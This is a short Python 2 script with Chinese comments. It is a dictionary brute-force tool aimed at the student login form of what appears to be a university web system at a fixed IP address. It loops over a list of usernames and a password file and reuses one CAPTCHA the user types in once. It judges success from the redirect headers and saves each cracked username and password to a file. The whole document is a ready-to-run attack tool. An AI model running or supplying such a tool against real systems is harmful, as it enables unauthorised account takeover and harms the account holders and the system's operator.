#encoding=utf-8
import urllib
import urllib2
import cookielib
import sys
import time

#cookie收集器
cj = cookielib.CookieJar()

#自定义异常类，分找到与未找到密码两种情况
class FoundException(Exception):
    pass

class NotFoundException(Exception):
    pass

#自定义HTTP重定向处理，只需检查头部信息即可判定是否登录成功
class MyHTTPRedirectHandler(urllib2.HTTPRedirectHandler):
    def http_error_302(self, req, fp, code, msg, headers):
        line = str(headers)
        if "tip.jsp" in line:
            raise NotFoundException
        raise FoundException

    http_error_301 = http_error_303 = http_error_307 = http_error_302

#用于发送HTTP请求
opener = urllib2.build_opener(MyHTTPRedirectHandler,\
            urllib2.HTTPCookieProcessor(cj))

def progressBar(total, checked, founded, startT):
    print ' '+'['+'='*int(checked*50/total)+'>'+\
            ' '*(49-int(checked*50/total))+\
            ']'+ '%%%.2f'%(checked*100/total)+' %d Founded'%founded+\
            ' %.2f key/s'%(checked/(time.time()-startT))+'\r',
    sys.stdout.flush()

#提交表单
def postRequest(name, pwd, captcha):
    total = len(name)*len(pwd)
    checked = 0.0
    founded = 0
    startT = time.time()
    query_args = {
        'who':'student',
        'id':'',
        'pwd':'',
        'yzm':captcha,
        'submit':'%C8%B7+%B6%A8'
        }
    for n in name:
        res = open('result', 'a')
        query_args['id'] = n
        for p in pwd:
            query_args['pwd'] = p
            encoded_args = urllib.urlencode(query_args)
            checked += 1
            try:
                opener.open('http://202.114.74.198/servlet/Login', encoded_args)
            except NotFoundException:
                progressBar(total, checked, founded, startT)
            except FoundException:
                founded += 1
                progressBar(total, checked, founded, startT)
                res.write("\n"+query_args['id']+": "+query_args['pwd'])
                res.close()
                break
            else:
                continue

#主程序
def main():
    
    image = open('captcha.jpg', 'wb')
    image.write(opener.open('http://202.114.74.198/GenImg').read())
    image.close()
    captcha = raw_input("The CAPTCHA:")
    
    name = [i.strip() for i in open('namelist', 'r')]
    pwd = [i.strip() for i in open('dictionary', 'r')]
    postRequest(name, pwd, captcha)

main()
